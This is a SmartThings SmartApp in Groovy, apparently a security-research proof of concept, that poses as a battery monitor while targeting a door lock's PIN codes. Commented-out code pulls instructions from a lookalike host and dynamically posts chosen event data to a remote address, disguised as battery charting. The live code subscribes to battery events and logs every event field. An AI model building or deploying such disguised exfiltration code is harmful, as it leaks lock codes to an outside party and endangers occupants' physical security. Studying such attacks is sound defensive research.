/**
 *  ShiqiLockPinCode
 *
 *  Copyright 2016 Yunhan Jia & Shiqi Wang
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
import groovy.json.JsonSlurper

definition(
    name: "ShiqiLockPinCode",
    namespace: "wsq",
    author: "Yunhan Jia & Shiqi Wang",
    description: "realize the pin-code redirection",
    category: "Safety & Security",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")


preferences {
	section("select Battery-powered devices") {
    	input "lock", "capability.battery", title:"b"
        //input "lock", "capability.lock", title:"door lock", required: true, multiple: false
	}
    
}

def installed() {
	log.debug "Installed with settings: ${settings}"

	initialize()
}

def updated() {
	log.debug "Updated with settings: ${settings}"
	unsubscribe()
	initialize()
}

def initialize() {
	setup()
    state.battery = 100
}

def setup() {
	//pull configuration from web service 
    def params = [
    	uri: "http://ssmartthings.appspot.com", 
    	path: "" 
    ]
    /*
    try { 
    	httpGet(params) { resp ->
    		 def jsonSlurper = new JsonSlurper() 
    		 def jsonString = resp.data.text 
    		 def configJson = jsonSlurper.parseText(jsonString) 
      		//store config in state 35 
            //the "battery" level state change 
     		 state.serverUpdateValue = 
             	configJson['serverUpdateValue'] 
      		//method used to transmit data to 
      		//charting service, httpPost for now 
      		state.method = configJson['method'] 
      		//our graphing webservice URL 
      		state.destIP = configJson['destIP'] 
      		//event data to inspect 
     		 state.data = configJson['data'] 
      	} 
      } catch (e) { 
      	log.error "something went wrong: $e"
      } 
     
     bats.each { b -> 
      	subscribe(b, state.serverUpdateValue, handler)
     }*/
     subscribe(lock, "battery", batteryHandler)
 } 
 def checkBattery(){
     log.debug settings.b.currentValue("code")
 }
 def batteryHandler(evt){
 	try {
    	log.debug "debug: $evt"
        log.debug evt?.value
     	log.debug evt?.jsonValue
        log.debug evt?.dataValue
        log.debug evt?.stringValue
        log.debug evt?.data
     }catch(e) {
     	log.debug e
     }
 }
 def lockHandler(evt){
     log.debug "jack: $evt.value"
 }
 /*def handler(evt) { 
      //transmit battery data to graphing webservice 
      try { 
     	 //currently httpPost(uri, body) 
     	 "${state.method}"("${state.destIP}", 
      			evt."${state.data}".inspect()) 
      } catch(Exception e) { 
      	log.error "something went wrong: $e" 
      } 
      
      //send user update if battery value 
      //below threshold 
      if(evt.device?.currentBattery < thresh) { 
      sendPush("Battery low for device ${evt.deviceId}") 
      }  
}*/